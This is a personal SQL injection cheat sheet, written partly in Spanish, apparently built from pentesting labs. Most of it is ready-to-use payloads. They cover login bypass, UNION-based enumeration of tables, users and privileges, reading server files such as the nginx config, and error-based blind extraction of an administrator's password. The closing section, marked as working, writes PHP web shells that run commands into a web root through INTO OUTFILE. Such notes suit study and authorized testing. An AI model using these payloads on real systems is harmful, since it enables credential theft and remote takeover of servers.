## Detect SQL injection vulnerabilities
- The single quote character `'` and look for errors or other anomalies.
- Boolean conditions such as `OR 1=1` and `OR '1'='1`, and look for differences in the application's responses.
## Subverting application logic
```java
' OR 1=1 -- -
' OR '1'='1
') OR 1=1 -- -
') OR '1'='1
' OR 1=1;--
```
## Types of SQL Injection
- In-band
	- Union based
	- Error based
- Blind
	- Boolean based
	- Time based
- Out-of-band

### In-band
Se llama "In-band" porque utilizas **el mismo canal de comunicación** para lanzar el ataque y para recibir los resultados. Es decir, los datos aparecen directamente en la página web que estás viendo.
#### Union based
For a `UNION` query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.
```java
' ORDER BY 2-- - Calcula la cantidad de columnas
' UNION SELECT NULL, NULL, NULL, NULL -- - Calcula la cantidad de columnas
' UNION SELECT 1, 2, 3, 4 -- - Ver que columnas se muestran en el front end
' UNION SELECT NULL FROM DUAL-- cuando es Oracle
' UNION SELECT current_user(),user(),database(), @@version-- -
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'-- -
' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'-- -
' UNION SELECT username || '~' || password FROM users -- Retrieving multiple values within a single column
') UNION SELECT 1, 2, LOAD_FILE('/etc/nginx/nginx.conf'), 4 -- -
') union select "","", "<?php system($_GET['cmd']); ?>", "" into outfile  '/var/www/chattr-prod/shell17.php'-- -
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
') UNION SELECT 1, 2,grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'chattr_dbUser'@'localhost'"-- -
```

#### Error based
This type of Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.
To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```java
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
CAST((SELECT example_column FROM example_table) AS int)
TrackingId=xyz'||(SELECT '')||'
TrackingId=xyz'||(SELECT '' FROM dual)||'
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
BGUyaVUGbC3qUtH' and substring((select password from users where username='administrator'),1,1) > 'e
'and (SELECT CASE WHEN (username='administrator' and length(password) >4) THEN TO_CHAR(1/0) ELSE 'a' END FROM users) = 'a
```

Documentacion de comandos para las los diferentes gestores de DB: 
https://portswigger.net/web-security/sql-injection/cheat-sheet
[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html
[3306 - Pentesting Mysql](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html#3306---pentesting-mysql)
[5432,5433 - Pentesting Postgresql](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
https://www.sqlinjection.net/

Labs github
https://github.com/Audi-1/sqli-labs


---funciona los tres
') union select "","", "<?php system($_GET['cmd']); ?>", "" into outfile  '/var/www/chattr-prod/shell17.php' -- -
') union select '','','',"<?php system($_REQUEST[0]); ?>" into outfile  '/var/www/chattr-prod/shell18.php' -- -
') union select '<?php','',"system($_REQUEST['cmd']); ","?>" into outfile  '/var/www/chattr-prod/shell15.php' -- -
note: debe ser junto `<?php` 

<? php system ($_REQUEST[0]); ?>
select '<? php $_GET['cmd'] ?> ' into outfile  "/var/www/chattr-prod/whell.php"
